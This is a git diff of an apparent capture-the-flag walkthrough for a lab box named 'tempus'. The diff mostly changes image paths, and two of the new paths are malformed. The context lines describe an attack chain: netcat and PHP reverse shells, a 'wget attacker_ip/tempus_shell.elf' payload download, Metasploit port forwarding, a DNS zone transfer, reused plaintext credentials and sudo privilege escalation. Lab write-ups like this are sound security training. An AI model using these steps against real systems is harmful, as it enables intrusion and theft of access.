@@ -100,7 +100,7 @@ I tried uploading a netcat reverse shell via command injection with the given IP
 
 Because we've proven that command injection works. Let's attempt to upload a netcat reverse shell. Use [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) for all your reverse shell needs!
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/netcat_reverse_shell2.png)
+![](https://github.com/azul-007/boxes/blob/main/images/netcat_reverse_shell2.png)
 
 ## Break out of Shell
 
@@ -109,17 +109,17 @@ python;
 
 python -c "import pty;pty.spawn('/bin/bash')"
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/python_break_shell.png)
+![](https://github.com/azul-007/boxes/blob/main/images/python_break_shell.png)
 
 ## False Root
 
 Enumerating the root directory you'll find a text file. List the contents annnnnnd...they got us with the okey doke...bastards lol
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/root_message.png)
+![](https://github.com/azul-007/boxes/blob/main/images/root_message.png)
 
 ## Further Enumeration
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/root_directory_enumeration.png)
+![](https://github.com/azul-007/boxes/blob/main/images/root_directory_enumeration.png)
 
 
 Enumerating further...We again list all the content within /root/.ncftp with ls -la to reveal any hidden directories. There are three files here:
@@ -127,13 +127,13 @@ Enumerating further...We again list all the content within /root/.ncftp with ls 
   * init_v3 - file used by NcFTP to annotate first time usage
   * trace.234 - traffic trace of LibNcFTP.
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/failed_connect_172_19_0_12.png)
+![](https://github.com/azul-007/boxes/blob/main/images/failed_connect_172_19_0_12.png)
 
 The file trace.234 shows a failure to connect to 172.19.0.12 ... but this IP isn't in our subnet of 192.168.19.0/24. I got a little frustrated and reached out to @DCAU. He gave me a hint that the box is in a docker container and that they're actually a few containers. Which would explain the failed connection to 172.19.0.12.
 
 But what flavor of linux is running? Execute cat /etc/*release to uncover this mystery
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/alpine_linux.png)
+![](https://github.com/azul-007/boxes/blob/main/images/alpine_linux.png)
 
 
 ## Docker Containers
@@ -144,7 +144,7 @@ So there are two ways I retroactively saw that I was in a docker container:
 
 Let's start with the second option. Notice the .dockerenv file has a size of 0 bytes.
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/dockerenv.png)
+![](https://github.com/azul-007/boxes/blob/main/images/dockerenv.png)
 
 And now to elaborate on the first option...
 
@@ -156,14 +156,14 @@ Going back to ~/ we see our usual directories but there is a peculiar one.. **/p
 
 We should try logging into 172.19.0.12. Before we do that, let's install lftp for apline linux. The command is **apk add lftp**
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/lftp.png)
+![](https://github.com/azul-007/boxes/blob/main/images/lftp.png)
 
 ## FTP CMS Credentials
 
 Using the credentials we found in 'Command Injection Test with Burp' log into 172.19.0.12: **lftp ftp://someuser@172.19.0.12**
 And we are successful logging in. List the contents and you'll find a cmscreds.txt file that reveales the admin CMS password: **hardEnough4u**
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/cms_creds.png)
+![](https://github.com/azul-007/boxes/blobmain/images/cms_creds.png)
 
 Download the file by typing get cmscreds.txt and exit by typing 'bye'.
 
@@ -173,7 +173,7 @@ I was kinda lost at this point. Had to take a break and come back into my notes 
 
 First verify if nmap is installed. It is not, so install with apk add nmap. Now scan the 172.19.0.0 subnet.
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/nmap_docker_containers.png)
+![](https://github.com/azul-007/boxes/blob/main/images/nmap_docker_containers.png)
 
 We have three machines:
   * 172.19.0.1
@@ -218,7 +218,7 @@ On the victim/target download the shell from attacker and give executable permis
 ````
 wget attacker_ip/tempus_shell.elf
 ````
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/metasploit_and_tempus_payload.png)
+![](https://github.com/azul-007/boxes/blobmain/images/metasploit_and_tempus_payload.png)
 
 ## Port Forwarding
 
@@ -228,7 +228,7 @@ Now we need to setup port forwarding rules
 portfwd add -l 8080 -p 8080 -r TARGET_IP
 ````
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/portfwd.png)
+![](https://github.com/azul-007/boxes/blob/main/images/portfwd.png)
 
 Now with this port forwarded we can access the machines on the 172.19.0.0/16 subnetwork.
 
@@ -242,7 +242,7 @@ in the segment [Performing Nmap Scan on Target](#performing-nmap-scan-on-target)
 
 172.19.0.12 has port 8080 opened, naturally we attempt to access that webpage:
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/172.19.0.1_8080_fail.png)
+![](https://github.com/azul-007/boxes/blob/main/images/172.19.0.1_8080_fail.png)
 
 > Surprise, surprise we can.t -___-
 
@@ -258,21 +258,21 @@ apk add bind-tools
 
 Use the axfr command to initiate a zone transfer on the target.
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_mofo_pwn2.png)
+![](https://github.com/azul-007/boxes/blob/main/images/ourcms_mofo_pwn2.png)
 
 From the output, you will see an entry giving the name of the cms; ourcms.mofo.pwn
 
 Next edit your host file to show your host ip mapped to ourcms.mofo.pwn
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/host_mapping.png)
+![](https://github.com/azul-007/boxes/blob/main/images/host_mapping.png)
 
 Now navigate to http://ourcms.mofo.pwn:8080/ and wait for it...SUCCESS!!!!
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_page.png) 
+![](https://github.com/azul-007/boxes/blob/main/images/ourcms_page.png) 
 
 Let's try http://ourcms.mofo.pwn:8080/admin/. Use the credentials found in [FTP CMS Credentials](#ftp-cms-credentials) with the username 'admin'.
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_admin.png)
+![](https://github.com/azul-007/boxes/blob/main/images/ourcms_admin.png)
 
 # PHP Reverse Shell
 
@@ -283,7 +283,7 @@ We can upload a php reverse shell. Go to the Edit Theme option on the Theme tab.
 
 Run netcat on your host with port 6000. Download the php reverse shell script from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the $ip and $port variables to your host IP and port 6000. 
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/pentest_monkey_php_reverse_shell.png)
+![](https://github.com/azul-007/boxes/blob/main/images/pentest_monkey_php_reverse_shell.png)
 
 Annnnnnnd houston we have a shell!!!
 
@@ -301,11 +301,11 @@ Change user to anthia:
 su anthia
 ````
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/responder_creds.png)
+![](https://github.com/azul-007/boxes/blob/main/images/responder_creds.png)
 
 Enumerating as anthia, I found a mail directory under /var. Reading the contents of anthia shows an email that displays more creds! franky:9u4lw0r82bo7
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/franky_creds.png)
+![](https://github.com/azul-007/boxes/blob/main/images/franky_creds.png)
 
 Change user to franky:
 ````
@@ -319,4 +319,4 @@ Issuing a sudo -l reveals franky can execute sudo on the nice command. Using [gt
 ./proof.sh
 ````
 
-![](https://github.com/azul-007/boxes/blob/master/tempus/images/root.png)
+![](https://github.com/azul-007/boxes/blob/main/images/root.png)
